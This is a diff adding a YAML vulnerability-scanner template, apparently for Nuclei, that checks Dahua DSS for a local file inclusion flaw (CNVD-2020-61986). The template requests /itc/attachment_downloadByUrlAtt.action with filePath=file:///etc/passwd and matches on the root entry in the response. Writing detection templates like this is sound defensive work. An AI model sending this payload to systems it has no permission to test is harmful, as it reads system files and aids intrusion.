@@ -1,0 +1,23 @@
+id: yaml-poc-dahuatech-dss-readfile-CNVD-2020-61986
+info:
+  name: Yaml Poc Dahuatech Dss Readfile Cnvd 2020 61986
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-dahuatech-dss-readfile-CNVD-2020-61986'
+  tags: lfi
+  reference:
+  - https://forum.butian.net/share/141
+http:
+- method: GET
+  path:
+  - /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:(.*):0:0:'
